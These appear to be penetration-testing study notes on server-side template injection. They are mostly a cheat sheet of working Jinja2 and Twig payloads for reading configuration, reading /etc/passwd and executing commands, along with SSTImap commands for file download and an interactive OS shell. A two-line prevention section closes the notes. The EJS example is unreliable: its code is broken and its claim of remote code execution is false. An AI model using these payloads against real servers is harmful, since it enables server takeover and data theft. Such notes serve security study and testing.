Server-side Template Injection (SSTI) occurs when an attacker can inject templating code into a user controlled input  that is later rendered by the server.

If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely.

---
## Methodology

### Identify the Vulnerable Input Field

The attacker first locates an input field, URL parameter, or any user-controllable part of the application that is passed into a server-side template without proper sanitization or escaping.

For example, the attacker might identify a web form, search bar, or template preview functionality that seems to return results based on dynamic user input.

**TIP**: Generated PDF files, invoices and emails usually use a template.

### Inject Template Syntax

The attacker tests the identified input field by injecting template syntax specific to the template engine in use. Different web frameworks use different template engines (e.g., Jinja2 for Python, Twig for PHP, or FreeMarker for Java).

## Test Strings
```
${{<%[%'"}}%\.
${7*7}
{{7*7}}
```
if the app is vulnerable, the server will error out.
### Identifying the templating engine in use:

this map helps in identifying the templating engine by analyzing the responses:
![[ss/Pasted image 20251126024146.png]]

start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection.

---
## Exploitation

####  Information disclosure:

JINJA:
obtain the web application's configuration using the following SSTI payload:
```jinja2
{{ config.items() }}
```
dump all available built-in functions:
```
{{ self.__init__.__globals__.__builtins__ }}
```

TWIG:
obtain info on template:
```twig
{{ _self }}
```
####  Local File Inclusion (LFI)

Jinja:
include a local file using open from `_builtins_`:
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

TWIG:
```twig
# requires symfony php web framework
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

----
####  RCE
we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`.
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### TWIG:
```twig
{{ ['id'] | filter('system') }}
```
 
#### EJS
 Example vulnerable EJS 
```JS
app.get("/profile", (req, res) => { const tpl = req.query.template; // attacker controls template res.render("profile", { bio: tpl }); });`
```
`<p><%- bio %></p> <!-- UNSAFE: as-is injection -->`

RCE in ejs:
```
?template=<%= process.cwd() %>

And EJS will execute that on the server → RCE.
```

---
## Tools

SSTI Map:
```
git clone https://github.com/vladko312/SSTImap
```
To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:
```
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test

<SNIP>

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

download remote files:
```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```
execute a system command using the `-S` flag:
```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

RCE: `--os-shell` to obtain an interactive shell:
```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```
---
## SSTI Prevention:
- ensure that user input is never fed into the call to the template engine's rendering function in the template parameter.
- separate the execution environment in which the template engine runs entirely from the web server, for instance, by setting up a separate execution environment such as a Docker container.